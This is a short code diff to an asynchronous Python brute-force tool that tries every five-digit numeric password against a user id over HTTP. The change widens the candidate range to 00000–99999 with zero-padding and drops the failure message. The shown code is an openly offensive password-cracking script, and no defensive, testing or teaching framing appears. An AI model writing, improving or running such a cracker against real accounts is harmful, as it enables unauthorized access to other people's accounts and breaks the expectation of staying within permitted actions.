@@ -20,7 +20,7 @@ async def brute(uid, pwds):
     global cracked
     async with aiohttp.ClientSession() as session:
         for password in pwds:
-            password = str(password)
+            password = str('%05d' % password)
 
             if cracked:
                 break
@@ -45,7 +45,7 @@ async def getResults(uid, pwd_list):
 
 if __name__ == '__main__':
     threads = cpu_count() * 2
-    pwds = [i for i in range(10000, 100000)]
+    pwds = [i for i in range(100000)]
     each = chunks(pwds, (len(pwds) // threads))
 
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -59,5 +59,3 @@ if __name__ == '__main__':
         if result:
             print(f'\n[*] Password successfully cracked: {result}')
             print(f'[!] Shutting down... (time: {int(int(time.time()) - start_time)})')
-        else:
-            print(f'[-] Failed to crack password :(\n[!] Shutting down...')
